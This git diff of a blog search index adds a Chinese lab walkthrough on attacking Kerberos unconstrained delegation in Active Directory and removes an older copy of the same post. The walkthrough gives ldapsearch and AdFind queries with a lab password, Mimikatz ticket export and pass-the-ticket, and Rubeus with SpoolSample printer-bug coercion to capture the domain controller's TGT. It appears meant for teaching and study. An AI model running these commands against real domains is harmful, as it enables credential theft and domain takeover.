+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331155749802.png" class title="image-20220331155749802">
 
 ]]></content>
       <categories>
@@ -1272,6 +1437,150 @@
       </categories>
       <tags>
         <tag>PE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>非约束委派的原理及利用</title>
+    <url>/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先需要了解什么是委派？</p>
+<p>委派一般出现在域环境当中，域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
+<p>说得再通俗一点就是，假设有三个对象</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316150047630.png" class title="image-20220316150047630">
+
+<p>当hostA作为用户，这个用户在访问服务B上的某一功能，而A访问B的这一功能的完成需要服务B向服务C上的专属于用户A的部分发起验证请求，如果A有访问权限，主机B就会代替主机A去访问主机C。也就是说主机A委派主机B上的服务代表自己向主机C上的服务发起请求。在域环境下就是域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
+<p>域委派主要分为两种，非约束委派和约束委派，还有一种基于资源的约束委派这里就不讨论了。</p>
+<h2 id="非约束委派的原理（Unconstrained-Delegation）"><a href="#非约束委派的原理（Unconstrained-Delegation）" class="headerlink" title="非约束委派的原理（Unconstrained Delegation）"></a>非约束委派的原理（Unconstrained Delegation）</h2><p>对于非约束性委派，服务账号可以获取被委派用户的 TGT ，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT ，模拟用户访问任意服务。那么非委派约束的攻击怎么产生的呢，就是诱导域管账号访问我们的被配置了非约束委派的主机，认证方式无论是kerberos还是ntlm都可以，这样子我们就拥有了域管的TGT，可以生成黄金票据。所以，非约束委派的主要目的就是获取域管账号的TGT，从而制作黄金票据。</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316145545395.png" class title="image-20220316145545395">
+
+<p>现在假设这么一种情形，service1配置了非约束性委派，用户A需要委派service1来访问service2。这个service1可以是主机账户。</p>
+<p>那么非约束性委派的过程可以大概理解为：</p>
+<p>1、用户A向KDC申请一张可转发的用户A自己的TGT与访问service1需要的ticket。<br>2、用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1。<br>3、service1使用那张tgt与session key来代表用户A行使后续操作例如访问service2。</p>
+<h1 id="非约束委派利用"><a href="#非约束委派利用" class="headerlink" title="非约束委派利用"></a>非约束委派利用</h1><h2 id="0x00部署环境"><a href="#0x00部署环境" class="headerlink" title="0x00部署环境"></a>0x00部署环境</h2><p>域控：192.168.93.30      主机名：DC</p>
+<p>域成员（配置了非约束性委派）：192.168.93.40   主机名：PC2  用户名：moretz</p>
+<p>域：whoamianony.org</p>
+<h2 id="0x01非约束委派配置及其特征"><a href="#0x01非约束委派配置及其特征" class="headerlink" title="0x01非约束委派配置及其特征"></a>0x01非约束委派配置及其特征</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">setspn -U -A <span class="title class_">MSSQLSvc</span>/mssql.<span class="property">whoamianony</span>.<span class="property">org</span>:<span class="number">1433</span> moretz</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230643559.png" class title="image-20220315230643559">
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230824870.png" class title="image-20220315230824870">
+
+<p>域控创建了一个域内可以委派的账户并注册spn后，勾选信任此用户作为任何服务的委派，此时这台moretz账号的主机就可以作为委派访问任意服务并且存储需要他进行委派访问的主机，比如A需要委派moretz主机访问C，那么moretz主机就会保存A的tgt</p>
+<p>当服务账号或者主机被设置为非约束性委派时，其 <strong>userAccountControl</strong> 属性会包含 <strong>TRUSTED_FOR_DELEGATION</strong>：</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230924720.png" class title="image-20220315230924720">
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231033106.png" class title="image-20220315231033106">
+
+<h2 id="0x02查找域内的非约束委派主机"><a href="#0x02查找域内的非约束委派主机" class="headerlink" title="0x02查找域内的非约束委派主机"></a>0x02查找域内的非约束委派主机</h2><h3 id="Idapsearch"><a href="#Idapsearch" class="headerlink" title="Idapsearch"></a>Idapsearch</h3><p>这是一款kali上自带的工具，适合在域外查询委派主机</p>
+<p>查找用户是否配置非约束委派</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+<p>-w 参数后面跟的是moretz用户的密码</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231349030.png" class title="image-20220315231349030">
+
+<p>过滤条件是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找配置为非约束委派的主机（域控的主机账号是默认开启非约束委派的）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231419152.png" class title="image-20220315231419152">
+
+<p>过滤条件是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>
+
+<p>两条查询语句的不同点就在于过滤条件的不同samAccountType&#x3D;805306369时为主机，samAccountType&#x3D;805306368时为用户</p>
+<h3 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h3><p>有账号密码时</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 192.168.93.30 -u users\moretz -up Moretz2021 -b &quot;DC=w</span><br><span class="line">hoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.1</span><br><span class="line">13556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232118802.png" class title="image-20220315232118802">
+
+<p>域控默认为非约束委派</p>
+<p>查询当前域内的非约束委派用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232256937.png" class title="image-20220315232256937">
+
+<p>可以看到这里的moretz用户就是非约束委派主机</p>
+<p>查询当前域内的非约束委派主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232355641.png" class title="image-20220315232355641">
+
+<p>还是过滤条件的不同</p>
+<p>其他工具还有powerview，个人还是喜欢AdFind</p>
+<h2 id="0x03非约束委派攻击"><a href="#0x03非约束委派攻击" class="headerlink" title="0x03非约束委派攻击"></a>0x03非约束委派攻击</h2><p>现在只有moretz自己的票据</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232506026.png" class title="image-20220315232506026">
+
+
+
+<p>若域内存在非约束委派机器，那么就可以使用域内我们想要获得票据的用户来登陆此非约束委派主机，从而在非约束委派主机中留下期望获得的主机票据的缓存</p>
+<p>这里先在域控主机（DC）上通过winrm连接域内的非委派主机（PC2）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter-PSSession -ComputerName PC2</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232601340.png" class title="image-20220315232601340">
+
+<p>可以看到这里是成功连上了PC2，并且是administrator权限</p>
+<p>在ptt之前，是无法访问域控的</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232851871.png" class title="image-20220315232851871">
+
+
+
+<p>利用猕猴桃将域控的tgt导出来，因为域控连接过pc2，因此会有域控的tgt缓存</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge </span><br><span class="line">sekurlsa::tickets /exports</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000914827.png" class title="image-20220316000914827">
+
+
+
+<p>进行ptt（票据传递），生成tgt票据（<strong>这里获得的票据不能算作黄金票据，我们获得的权限只是域控的本地管理权限，不能连接域控，黄金票据的条件是缺一不可的，但是我们可以获取所有用户的hash，制作真正的黄金票据</strong>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt [0;291f51]-2-0-60a10000-Administrator@krbtgt-WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000954582.png" class title="image-20220316000954582">
+
+
+
+<p>成功生成票据，接下来制作黄金票据的过程就不赘述了</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316001115188.png" class title="image-20220316001115188">
+
+
+
+
+
+<p>除了直接在域控使用winrm，还可以利用<strong>非约束委派+spooler打印机服务</strong>强制指定的主机进行连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe monitor /interval:1 filteruser:DC$ &gt; c:\users\hash.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用rubues来监听本机连接的情况，设置监听间隔为一秒，监控对象为域控的主机名</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172630642.png" class title="image-20220316172630642">
+
+
+
+<p>运行spoolsample利用打印服务，强制让域控DC向域成员PC2验证身份，因为设置了rubeus监听，所以可以抓到TGS</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC PC2</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172651602.png" class title="image-20220316172651602">
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172722495.png" class title="image-20220316172722495">
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172913745.png" class title="image-20220316172913745">
+
+<p>这里报错了，但是的确rubeus抓到了base64加密的tgt(hash.txt)</p>
+<p>这里用powershell解密base64，其他方法也可以，但是powershell可以直接将tgt文件保存下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;c:\users\moretz.whoamianony\tgt.kirbi&quot;, [Convert]::FromBase64String(&quot;得到的base64&quot;))</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174513722.png" class title="image-20220316174513722">
+
+
+
+<p>使用mimikatz导入票据后，跟之前一样也是个有域控本地管理员权限的，用mimikatz制作黄金票据后可以用psexec.exe反弹shell，不需要账号密码。（lsadump）</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174621620.png" class title="image-20220316174621620">
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1465,185 +1774,6 @@
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317155009305.png" class title="image-20220317155009305">
 
 <p>这里我不明白为什么能直接返回约束委派服务的主机的system的shell，我的约束委派主机是192.168.93.40 的moretz（PC2），设置的可以访问192.168.93.30 DC的cifs服务。预期可能是administrator的权限，但是返回了system权限不太懂。</p>
-]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>重定位表结构解析</title>
-    <url>/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="重定位表的作用"><a href="#重定位表的作用" class="headerlink" title="重定位表的作用"></a>重定位表的作用</h1><p>重定位表用于在程序加载到内存中时，进行内存地址的修正。如果一个exe需要三个动态链接库dll（a.dll，b.dll，c.dll），假设这个exe的ImageBase为400000H，而a.dll、b.dll、c.dll的基址ImageBase均为1000000H。<br>那么操作系统的加载程序在将exe加载进内存时，直接复制其程序到400000H开始的虚拟内存中，接着一一加载a.dll、b.dll、c.dll：假设先加载a.dll，如果exe的ImageBase + SizeOfImage + 1000H不大于1000000H，则a.dll直接复制到1000000H开始的内存中；当b.dll加载时，虽然其基址也为1000000H，但是由于1000000H已经被a.dll占用，则b.dll需要重新分配基址，比如加载程序经过计算将其分配到1200000H的地址，c.dll同样经过计算将其加载到150000H的地址。如下图所示：</p>
-<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328095543424.png" class title="image-20220328095543424">
-
-<p>当加载器加载程序时，如果加载器为某PE（.exe、.dll）分配的基址与其自身默认记录的ImageBase不相同，那么该程序文件加载完毕后就需要修正重定位表中的所有需要修正的地址。如果加载器分配的基址和该程序文件中记录默认的ImageBase相同，则不需要修正，重定位表对于该dll也是没有效用的。</p>
-<h1 id="查看基本的结构"><a href="#查看基本的结构" class="headerlink" title="查看基本的结构"></a>查看基本的结构</h1><p>重定位的结构在IMAGE_BASE_RELOCATION当中</p>
-<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327105514756.png" class title="image-20220327105514756">
-
-
-
-<p>结构十分简单，一共只有三个字段</p>
-<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327105843085.png" class title="image-20220327105843085">
-
-<p>在LordPE中有区段，RVA等信息，使用函数打印出来</p>
-<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327111757560.png" class title="image-20220327111757560">
-
-
-
-<p>具体的函数</p>
-<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327113624209.png" class title="image-20220327113624209">
-
-
-
-<p>查看运行结果</p>
-<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327114233192.png" class title="image-20220327114233192">
-]]></content>
-      <categories>
-        <category>逆向</category>
-      </categories>
-      <tags>
-        <tag>PE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>非约束委派的原理及利用</title>
-    <url>/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先需要了解什么是委派？</p>
-<p>委派一般出现在域环境当中，域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
-<p>说得再通俗一点就是，假设有三个对象</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316150047630.png" class title="image-20220316150047630">
-
-<p>当hostA作为用户，这个用户在访问服务B上的某一功能，而A访问B的这一功能的完成需要服务B向服务C上的专属于用户A的部分发起验证请求，如果A有访问权限，主机B就会代替主机A去访问主机C。也就是说主机A委派主机B上的服务代表自己向主机C上的服务发起请求。在域环境下就是域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
-<p>域委派主要分为两种，非约束委派和约束委派，还有一种基于资源的约束委派这里就不讨论了。</p>
-<h2 id="非约束委派的原理（Unconstrained-Delegation）"><a href="#非约束委派的原理（Unconstrained-Delegation）" class="headerlink" title="非约束委派的原理（Unconstrained Delegation）"></a>非约束委派的原理（Unconstrained Delegation）</h2><p>对于非约束性委派，服务账号可以获取被委派用户的 TGT ，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT ，模拟用户访问任意服务。那么非委派约束的攻击怎么产生的呢，就是诱导域管账号访问我们的被配置了非约束委派的主机，认证方式无论是kerberos还是ntlm都可以，这样子我们就拥有了域管的TGT，可以生成黄金票据。所以，非约束委派的主要目的就是获取域管账号的TGT，从而制作黄金票据。</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316145545395.png" class title="image-20220316145545395">
-
-<p>现在假设这么一种情形，service1配置了非约束性委派，用户A需要委派service1来访问service2。这个service1可以是主机账户。</p>
-<p>那么非约束性委派的过程可以大概理解为：</p>
-<p>1、用户A向KDC申请一张可转发的用户A自己的TGT与访问service1需要的ticket。<br>2、用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1。<br>3、service1使用那张tgt与session key来代表用户A行使后续操作例如访问service2。</p>
-<h1 id="非约束委派利用"><a href="#非约束委派利用" class="headerlink" title="非约束委派利用"></a>非约束委派利用</h1><h2 id="0x00部署环境"><a href="#0x00部署环境" class="headerlink" title="0x00部署环境"></a>0x00部署环境</h2><p>域控：192.168.93.30      主机名：DC</p>
-<p>域成员（配置了非约束性委派）：192.168.93.40   主机名：PC2  用户名：moretz</p>
-<p>域：whoamianony.org</p>
-<h2 id="0x01非约束委派配置及其特征"><a href="#0x01非约束委派配置及其特征" class="headerlink" title="0x01非约束委派配置及其特征"></a>0x01非约束委派配置及其特征</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">setspn -U -A <span class="title class_">MSSQLSvc</span>/mssql.<span class="property">whoamianony</span>.<span class="property">org</span>:<span class="number">1433</span> moretz</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230643559.png" class title="image-20220315230643559">
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230824870.png" class title="image-20220315230824870">
-
-<p>域控创建了一个域内可以委派的账户并注册spn后，勾选信任此用户作为任何服务的委派，此时这台moretz账号的主机就可以作为委派访问任意服务并且存储需要他进行委派访问的主机，比如A需要委派moretz主机访问C，那么moretz主机就会保存A的tgt</p>
-<p>当服务账号或者主机被设置为非约束性委派时，其 <strong>userAccountControl</strong> 属性会包含 <strong>TRUSTED_FOR_DELEGATION</strong>：</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230924720.png" class title="image-20220315230924720">
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231033106.png" class title="image-20220315231033106">
-
-<h2 id="0x02查找域内的非约束委派主机"><a href="#0x02查找域内的非约束委派主机" class="headerlink" title="0x02查找域内的非约束委派主机"></a>0x02查找域内的非约束委派主机</h2><h3 id="Idapsearch"><a href="#Idapsearch" class="headerlink" title="Idapsearch"></a>Idapsearch</h3><p>这是一款kali上自带的工具，适合在域外查询委派主机</p>
-<p>查找用户是否配置非约束委派</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
-
-<p>-w 参数后面跟的是moretz用户的密码</p>
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231349030.png" class title="image-20220315231349030">
-
-<p>过滤条件是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>
-
-
-
-<p>查找配置为非约束委派的主机（域控的主机账号是默认开启非约束委派的）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231419152.png" class title="image-20220315231419152">
-
-<p>过滤条件是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>
-
-<p>两条查询语句的不同点就在于过滤条件的不同samAccountType&#x3D;805306369时为主机，samAccountType&#x3D;805306368时为用户</p>
-<h3 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h3><p>有账号密码时</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 192.168.93.30 -u users\moretz -up Moretz2021 -b &quot;DC=w</span><br><span class="line">hoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.1</span><br><span class="line">13556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232118802.png" class title="image-20220315232118802">
-
-<p>域控默认为非约束委派</p>
-<p>查询当前域内的非约束委派用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232256937.png" class title="image-20220315232256937">
-
-<p>可以看到这里的moretz用户就是非约束委派主机</p>
-<p>查询当前域内的非约束委派主机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232355641.png" class title="image-20220315232355641">
-
-<p>还是过滤条件的不同</p>
-<p>其他工具还有powerview，个人还是喜欢AdFind</p>
-<h2 id="0x03非约束委派攻击"><a href="#0x03非约束委派攻击" class="headerlink" title="0x03非约束委派攻击"></a>0x03非约束委派攻击</h2><p>现在只有moretz自己的票据</p>
